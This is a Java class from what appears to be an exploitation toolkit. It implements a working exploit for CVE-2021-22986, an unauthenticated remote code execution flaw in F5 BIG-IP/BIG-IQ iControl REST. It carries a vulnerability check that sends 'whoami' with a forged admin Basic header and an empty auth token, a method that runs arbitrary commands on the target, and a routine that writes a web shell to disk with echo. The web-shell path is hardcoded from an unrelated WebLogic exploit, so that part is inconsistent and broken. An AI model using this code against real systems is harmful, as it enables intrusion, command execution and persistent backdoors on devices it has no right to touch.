package fun.fireline.exp.others;

import com.alibaba.fastjson.JSONObject;
import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;
import fun.fireline.tools.Tools;

import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/4/3 23:20
 * @github https://github.com/yhy0
 *
 *  CVE-2021-22986 F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞
 *  未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。
 */


public class CVE_2021_22986 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private static final String VULURL = "/mgmt/tm/util/bash";
    private static final String PAYLOAD = "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}";

    public CVE_2021_22986() {

    }

    public boolean checkVul(String url) {
        this.target = url;

        String uuid =  UUID.randomUUID().toString();
        String path = url + VULURL;
        try {

            HashMap<String, String> map = new HashMap();       //请求headers
            // 设置 header ，执行命令
            map.put("X-F5-Auth-Token", "");
            map.put("Authorization", "Basic YWRtaW46QVNhc1M=");

            String result = HttpTool.postHttpReuest(path, PAYLOAD, "UTF-8", map, "application/json");

            boolean flag = result.contains("commandResult");
            if(flag) {
                this.isVul = true;
            }

            return flag;

        } catch (Exception e) {
            logger.error(e);
        }

        return false;
    }

    public String exeCmd(String cmd, String encoding){

        String path = this.target + VULURL;
        try {
            HashMap<String, String> map = new HashMap();       //请求headers

            // 设置 header ，执行命令
            map.put("X-F5-Auth-Token", "");
            map.put("Authorization", "Basic YWRtaW46QVNhc1M=");


            String payload = String.format("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", cmd);
            String result = HttpTool.postHttpReuest(path, payload, encoding, map, "application/json");

            JSONObject object = JSONObject.parseObject(result);
            result = object.getString("commandResult");

            return result + "\r\n 命令执行成功";

        } catch (Exception e) {
            logger.error(e);
        }
        return "命令执行失败";
    }

    // 上传文件这里并没有实现
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        // 因为使用 echo 写 shell ，这里需要对 < > 转义
        String shell_info = Tools.get_escape_shell(fileContent, platform);

        System.out.println(shell_info);
        String path = this.getWebPath();

        String cmd = String.format("echo %s > %s", shell_info, path + filename);
        System.out.println(cmd);
        String str = this.exeCmd(cmd, "UTF-8");
        System.out.println("\r\n");
        System.out.println(str);

        if(this.target.endsWith("/")) {
            return this.target + "console/images/" + filename;
        } else {
            return this.target + "/console/images/" + filename;
        }

    }

    public String getWebPath(){
        // 根据不同的服务，查找对应的web路径

        // 这个CVE-2020-14882 我直接写死 路径 演示使用

        return "../../../wlserver/server/lib/consoleapp/webapp/images/";
    }

    public boolean isVul() {
        return this.isVul;
    }

}
